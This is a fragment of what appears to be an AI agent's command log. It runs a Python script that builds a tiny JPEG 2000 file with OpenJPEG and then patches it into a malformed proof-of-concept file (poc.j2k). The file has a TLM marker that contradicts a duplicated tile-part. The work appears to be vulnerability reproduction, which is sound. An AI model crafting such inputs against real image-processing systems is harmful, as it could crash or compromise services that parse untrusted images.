Running command: cd /workspace && bash build.sh 'python3 - <<"PY"
from pathlib import Path
# Build tiny.j2k and patch with a TLM marker declaring only one tile-part, then duplicate SOT/SOD tile part.
import struct, subprocess, os
pgm=b"P5\n1 1\n255\n\0"
Path("/tmp/tiny.pgm").write_bytes(pgm)
os.system("./build/bin/opj_compress -i /tmp/tiny.pgm -o /tmp/tiny.j2k -n 1 -r 1 -t 1,1 -I >/tmp/log 2>&1")
b=Path("/tmp/tiny.j2k").read_bytes()
print("orig len",len(b), "SOT", b.find(b"\xff\x90"), "SOD", b.find(b"\xff\x93"))
sot=b.find(b"\xff\x90")
sod=b.find(b"\xff\x93",sot)
eoc=b.rfind(b"\xff\xd9")
main=b[:sot]
tp=b[sot:eoc]
# patch Psot of tile part to its own length (SOT..before next marker) including SOT/SOD/data. Orig Psot appears 18 for 18 bytes.
print('tp len',len(tp), tp.hex())
# Ensure TNsot zero at byte SOT+11, TPsot at +10.
def make_tp(tpno):
    x=bytearray(tp)
    x[10]=tpno
    x[11]=0 # TNsot unspecified
    # Psot = len(tp)
    x[6:10]=struct.pack('>I', len(x))
    return bytes(x)
tp0=make_tp(0); tp1=make_tp(1)
# TLM marker in main header just before SOT: FF55, Ltlm=7, Ztlm=0, Stlm=0x40 (ST=0, SP=1 -> 4-byte length), Ptlm=len(tp0)
tlm=b"\xff\x55"+struct.pack('>HBBI',7,0,0x40,len(tp0))
poc=main+tlm+tp0+tp1+b"\xff\xd9"
Path("/tmp/poc.j2k").write_bytes(poc)
print("poc len",len(poc), "tlm", tlm.hex())
for i in range(0,len(poc),16): print(f"{i:04x}: "+" ".join(f"{x:02x}" for x in poc[i:i+16]))
PY
